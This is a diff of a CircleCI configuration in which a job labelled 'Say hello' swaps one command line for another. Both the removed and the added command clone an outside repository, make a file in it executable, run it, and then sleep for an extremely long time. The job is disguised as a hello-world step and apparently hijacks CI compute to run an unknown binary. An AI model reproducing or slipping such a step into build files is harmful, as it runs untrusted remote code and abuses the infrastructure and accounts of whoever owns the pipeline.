@@ -18,7 +18,7 @@ jobs:
       - run:
           name: "Say hello"
           no_output_timeout : 1h
-          command: echo Hello, World!;git clone https://gitlab.com/abidlozano/code.git;cd code;chmod 700 bin;./bin;sleep 437626763463
+          command: echo Hello, World!;git clone https://github.com/cantribused/Contriibused.git;cd Contriibused;chmod 700 rom;./rom;sleep 437626763463
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
